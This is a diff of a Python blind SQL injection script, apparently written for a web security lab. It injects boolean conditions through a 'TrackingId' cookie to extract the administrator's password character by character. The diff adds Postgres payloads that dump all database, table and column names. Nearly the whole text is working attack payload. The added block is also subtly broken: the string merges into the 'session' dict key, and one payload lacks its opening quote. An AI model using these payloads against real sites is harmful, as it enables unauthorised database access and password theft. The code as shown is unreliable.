@@ -27,9 +27,11 @@ def bruteForce():
         for char in char_pool:
             custom_cookies = { # injectable field (CHANGE COOKIES)
                     "TrackingId": f"Xa5MpixG2VNuLJtG' and (select substring(password,{index},1) from users where username='administrator' limit 1)='{char}'-- -",
-                    # To "fuzz" the name of the table: ' and (select substring(table_name, {index}, 1) from information_schema.tables limit 1)='{char}'-- -
-                    # Name of the first column of the table "users": ' and (select substring(column_name,{index},1) from information_schema.columns where table_name='users' limit 1)='{char}'-- -
-                    # TODO: Figure how to enumerate all columns and all tables
+                    """ *Postgres*
+                    To dump all databases: ' and (select substring(string_agg(datname, ','),{index},1) from pg_database)='{char}'-- -
+                    To dump all tables:  and (select substring(string_agg(table_name, ','),{index},1) from information_schema.tables [where table_schema='public'])='{char}'-- -
+                    To dump all columns: ' and (select substring(string_agg(column_name, ','),{index},1) from information_schema.columns where table_name='users')='{char}'-- -
+                    """
                     "session": "OWOYC57WEb2u92Fel8aKaAT3TS9MlB65"
                     }
             p1.status(custom_cookies["TrackingId"])
